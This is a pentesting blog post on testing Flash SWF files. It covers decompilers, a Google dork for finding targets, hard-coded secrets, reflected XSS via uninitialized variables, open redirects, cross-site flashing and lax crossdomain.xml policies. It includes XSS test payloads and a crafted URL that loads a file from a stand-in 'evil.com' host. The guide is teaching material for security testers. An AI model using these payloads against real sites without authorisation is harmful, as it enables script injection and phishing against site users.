---
layout: post
title: Flash Testing for Dummies
tags: [pentesting]
category: posts
---

*or: A Fast Flash Testing Guide for the Busy Pentester*

--

The aim of this "guide" is to provide an up-to-date and easy way to test SWF files, without the assle of learning ActionScript or wasting excessive time, while still getting the relevant low hanging fruits.

*Note - All the techniques presented in this article have been tested and confirmed working in Chrome 23 with Flash 11.5, running on OS X 10.7.5.*

### # Tools of the Trade

The most useful tool is probably [HP SWFScan][swfscan], which provides a decompiler and an automatic vulnerability scanner. While the software is prone to false negatives, it's still the best tool when you need to analyze ActionScript code in a limited time.

If a Windows operating system is not an option or you'd rather dive directly into the code without a fancy GUI, [flare][flare] is what you are looking for. Flare is a simple command-line decompiler, very reliable, but its development came to a halt in 2005.

Other tools that might be useful are [Adobe SWF Investigator][swfinvestigator], which provides a disassembler and other utilities, and [SWFTools][swftools], a collection of several software that, sadly, lacks a decompiler. 

### 1- Search Engine Discovery

In order to find all (most?) the SWF files on your target domain you just need a simple Google dork: `filetype:swf site:TARGET`.

If the amount of files returned by the previous generic search is too much, try reducing it with `inurl:login`, `inurl:admin`, `inurl:secure` or similar.
	
### 2- Information Disclosure

There is literally anything you could find hard-coded inside SWF files: from remote gateways to authentication credentials, from IP addresses to remote resources.

In order to identify all the interesting information inside of a SWF file, you need to decompile (or disassemble) it and review the code manually. Note that while SWFScan sometimes identifies critical data, it just isn't reliable enough to trust exclusively its automatic results.

### 3- Reflected Cross-Site Scripting

The main cause for XSS in Flash files is the use of **uninitialized variables**, which, if not initialized to a value, can be arbitrarily assigned by users. Furthermore, global variables (\_root.\*, \_global.\*, \_level0.\*) and unsafe methods (e.g. getURL, loadVars.\*, XML.load, htmlText, loadVariables, loadMovie, loadMovieNum) need to be taken into account when looking for vulnerable code in Flash files. A sample payload that can be used to test for XSS is `javascript:alert('XSS')`.

	{% raw %}
	button 16 {
		on (release) {
			getURL(clickTAG, '_self');
		}
	}
	{% endraw %}

The *clickTAG* variable in the previous decompiled code is not initialized and will accept any value. Hence, the XSS could be triggered trivially: `http://example.com/home.swf?clickTAG=javascript:alert('XSS')`.

The following are all examples of code vulnerable to XSS.

	{% raw %}
	var __callResult_1 = getURL(_root.clickTag, "_blank");
	var __callResult_2 = getURL(clickTag, "_blank");
	var __callResult_3 = getURL(clickTag, "");
	{% endraw %}

On the other hand, `var __callResult_4 = getURL("http://example.com", "_blank");` is not vulnerable.

### 4- Open Redirect

Uninitialized variables also cause SWFs to be vulnerable to Open Redirects, allowing an attacker to forge a URL that will redirect users to an arbitrary domain.

If you find uninitialized variables in the code or a file that accepts a remote file as parameter (e.g. `http://example.com/supertrooper.swf?band=/abba.asp`), it is probably an open redirector and should be tested accordingly.

##### Recap: How to Test for XSS and Open Redirects

1. Get the SWF file
2. Decompile it
3. Scan the code with SWFScan
4. Review the code checking for variables
5. Test the variables that seem vulnerable (do not trust SWFScan)

### 5- Cross-Site Flashing

Cross-Site Flashing (XSF) occurs when an SWF file is able to load another file from a different domain. The vulnerable SWF can be exploited to load a malicious Flash file that can be used to perform several kinds of attacks, such as Cross-Site Scripting or Phishing via a fake interface. Let's take a look at some code:

	{% raw %}
	internal function frame1(){
   		this.url = "";
   		this.movieurl = "";
   		this.paramObj =
   		LoaderInfo(this.root.loaderInfo).parameters;
   		this.movieurl = String(this.paramObj["movieurl"]);
   		if(this.movieurl != "") {
       		this.LoadMovie(this.movieurl);
   		} else {
       		this.LoadMovie("defaulf.swf");
   		}
		[...] 
		{% highlight actionscript %}
	
As can be seen in the previous code, the *movieurl* variable is not initialized and the *LoadMovie* function accepts any value, even from external domains. So, the vulnerable SWF will load any file: `http://example.com/movie.swf?movieurl=http://evil.com/xss.swf`

### 6- Crossdomain Policy

A SWF file is not allowed to access data that resides outside of its web domain and a sub-domain is not able to read data from a parent domain (and vice-versa). The Flash Player uses cross-domain policy files to give permission to access data from a given domain.

Testing for a vulnerable cross-domain policy is trivial: take a look at the `/crossdomain.xml` file, always found in the website root. If it looks like the following code...

	<cross-domain-policy>
		<allow-access-from domain="*"/>
	</cross-domain-policy>
	
...then the website accepts requests from Flash files from **all** domains and will return the full response.

### # References

Following are the articles and documents used to get most of the information presented in this post, listed chronologically.

* 2006 - [The Dangers of Cross-Domain Ajax with Flash][shiflett1] (by Chris Shiflett)
* 2006 - [The crossdomain.xml Witch Hunt][shiflett2] (by Chris Shiflett)
* 2008 - [Crossdomain.xml Invites Cross-site Mayhem][grossman] (by Jeremiah Grossman)
* 2009 - [Blinded by Flash: Widespread Security Risks Flash Developers Don’t See][prajakta] (by Prajakta Jagdale)
* 2010 - [Neat, New, and Ridiculous Flash Hack][bailey] (by Mike Bailey)
* [OWASP - Testing for Cross Site Flashing][owasp]


[swfscan]: http://h30499.www3.hp.com/t5/Following-the-Wh1t3-Rabbit/SWFScan-FREE-Flash-decompiler/ba-p/5440167
[flare]: http://www.nowrap.de/flare.html
[swfinvestigator]: http://labs.adobe.com/downloads/swfinvestigator.html
[swftools]: http://www.swftools.org/

[prajakta]: http://www.blackhat.com/presentations/bh-dc-09/Jagdale/BlackHat-DC-09-Jagdale-Blinded-by-Flash.pdf
[bailey]: http://www.blackhat.com/presentations/bh-dc-10/Bailey_Mike/BlackHat-DC-2010-Bailey-Neat-New-Ridiculous-flash-hacks-slides.pdf
[shiflett1]: http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domain-ajax-with-flash
[shiflett2]: http://shiflett.org/blog/2006/oct/the-crossdomain.xml-witch-hunt
[grossman]: http://jeremiahgrossman.blogspot.it/2008/05/crossdomainxml-invites-cross-site.html

[owasp]: https://www.owasp.org/index.php/Testing_for_Cross_site_flashing_%28OWASP-DV-004%29
